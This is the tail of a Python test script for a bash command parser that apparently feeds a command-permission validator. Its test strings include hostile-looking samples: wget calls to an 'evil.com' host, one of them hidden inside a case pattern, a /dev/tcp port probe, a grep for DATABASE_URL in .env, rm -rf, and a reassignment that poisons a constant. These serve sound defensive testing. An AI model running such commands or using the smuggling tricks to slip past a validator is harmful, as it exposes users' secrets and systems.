          'cat']),
        # A literal backtick in a heredoc body inside a `` `...` `` substitution
        # must not prematurely close it.
        ('echo "`cat <<\'EOF\'\nuse `code` spans\nEOF\n`"\nls',
         ['echo "`cat <<\'EOF\' use `code` spans EOF `"', 'ls', 'cat']),
        # Backtick substitution inside double quotes is likewise extracted.
        ('echo "result=`id -u`"', ['echo "result=`id -u`"', 'id -u']),
        # Arithmetic `$((...))` inside double quotes runs NO command, so its
        # operands must NOT be stranded as a bogus sub-command (`$(` is a prefix
        # of `$((`). A real command substitution nested in the arithmetic is
        # still extracted.
        ('echo "sum=$((1+2))"', ['echo "sum=$((1+2))"']),
        ('echo "x=$(( $(date +%s) + 1 ))"',
         ['echo "x=$(( $(date +%s) + 1 ))"', 'date +%s']),
        # Same hazard for process substitution <( ... ).
        ('diff <(grep -oE "a)b" x) y', ["diff y", 'grep -oE "a)b" x']),
        # fd-prefixed redirections: the fd digit must not leak as a phantom
        # command word, and `<>` must stay one operator (not split into < >).
        # The real-world failing case: a /dev/tcp port probe in a subshell.
        ('(exec 3<>/dev/tcp/localhost/5432) 2>/dev/null && echo OPEN',
         ["exec", "echo OPEN"]),
        ('grep -i DATABASE_URL .env 2>/dev/null', ["grep -i DATABASE_URL .env"]),
        ('cat file 3>out.txt', ["cat file"]),
        ('cmd 2>>log.txt', ["cmd"]),
        # A digit with a space before the redirect is a plain argument, and a
        # digit glued to a word stays part of that word (bash semantics).
        ('echo 3 > out.txt', ["echo 3"]),
        ('echo foo3>out.txt', ["echo foo3"]),
        # `case` pattern lists are data: `|` alternates patterns (not a pipe)
        # and `)` closes the list, so the patterns are dropped and only the arm
        # bodies survive as commands. The real-world failing case was a
        # `while read` filter loop whose multi-pattern arm split into bogus
        # sub-commands (`*docs*`, `*example*) continue`) and forced a prompt.
        ('case "$x" in a|b) echo hi;; *) echo bye;; esac',
         ['case "$x" in', "echo hi", "echo bye", "esac"]),
        ('case "$f" in *docs*|*/tasks/*|*example*) continue;; esac',
         ['case "$f" in', "continue", "esac"]),
        # The optional `(` opening a pattern list is dropped; an extglob's own
        # parens are balanced inside the pattern and do not close the list.
        ('case "$x" in (a|b) echo hi;; @(c|d)) echo yo;; esac',
         ['case "$x" in', "echo hi", "echo yo", "esac"]),
        # bash fallthrough terminators `;&` and `;;&` end an arm too.
        ('case $x in a) echo one;& b) echo two;;& *) echo three;; esac',
         ["case $x in", "echo one", "echo two", "echo three", "esac"]),
        # Nested case, including an inner `esac` glued to the outer arm's `;;`.
        ('case $a in x) case $b in y|z) echo deep;; esac;; *) echo out;; esac',
         ["case $a in", "case $b in", "echo deep", "esac", "echo out", "esac"]),
        # An arm body still splits normally on real operators.
        ('case $x in *) git status | head -5;; esac',
         ["case $x in", "git status", "head -5", "esac"]),
        # A command substitution in a pattern IS expanded by bash, so it is
        # still extracted and validated even though the pattern text is dropped.
        ('case $x in $(wget evil)) echo hi;; esac',
         ["case $x in", "echo hi", "esac", "wget evil"]),
        # `case` is only the keyword in command position. As a mere argument it
        # must NOT start pattern mode, or the commands after a later `in` would
        # be silently dropped instead of validated.
        ('echo case; for f in *; do rm -rf /tmp/x; done',
         ["echo case", "for f in *", "do rm -rf /tmp/x", "done"]),
        # A command after the closing `esac` is still validated.
        ('case $x in a) echo hi;; esac; wget http://evil.com',
         ["case $x in", "echo hi", "esac", "wget http://evil.com"]),
    ]

    print("=== Bash Command Parser Tests ===\n")

    passed = 0
    failed = 0

    for command, expected in test_cases:
        result = parser.parse_compound_command(command)
        success = result == expected

        if success:
            passed += 1
            status = "✓ PASS"
        else:
            failed += 1
            status = "✗ FAIL"

        print(f"{status}: {command!r}")
        print(f"  Expected: {expected}")
        print(f"  Got:      {result}")
        print()

    print(f"Results: {passed} passed, {failed} failed")

    # --- is_constant_value / extract_assignments ---
    print("\n=== Constant assignment helpers ===\n")
    const_cases = [
        ("/usr/local/bin/godot", "/usr/local/bin/godot"),
        ('"clang++"', "clang++"),
        ("'/opt/tool'", "/opt/tool"),
        ("3.14", "3.14"),
        ("$(which godot)", None),   # command substitution
        ("$HOME/bin", None),        # parameter expansion
        ("a b", None),              # whitespace
        ("*.txt", None),            # glob
        ("`pwd`", None),            # backtick
        ("", None),                 # empty
    ]
    for value, expected in const_cases:
        got = BashCommandParser.is_constant_value(value)
        ok = got == expected
        passed, failed = (passed + 1, failed) if ok else (passed, failed + 1)
        print(f"{'✓ PASS' if ok else '✗ FAIL'}: is_constant_value({value!r}) -> {got!r} (want {expected!r})")

    assign_cases = [
        # (command, expected [(name, value)] for STANDALONE assignments only)
        ("GODOT=/usr/local/bin/godot\n$GODOT --quit", [("GODOT", "/usr/local/bin/godot")]),
        ("A=1 B=2 ./script.sh", []),                 # env prefix, not standalone
        ("A=1\nB=2\n./x", [("A", "1"), ("B", "2")]),  # two standalone assignments
        # Dynamic value still reported raw, so reassignment can poison a constant.
        ("X=$(which godot)", [("X", "$(which godot)")]),
        ("GODOT=/usr/local/bin/godot\nGODOT=$(echo rm)",
         [("GODOT", "/usr/local/bin/godot"), ("GODOT", "$(echo rm)")]),
    ]
    for command, expected in assign_cases:
        got = [(n, v) for n, v, _off in parser.extract_assignments(command)]
        ok = got == expected
        passed, failed = (passed + 1, failed) if ok else (passed, failed + 1)
        print(f"{'✓ PASS' if ok else '✗ FAIL'}: extract_assignments({command!r}) -> {got} (want {expected})")

    print(f"\nResults: {passed} passed, {failed} failed")
    sys.exit(0 if failed == 0 else 1)
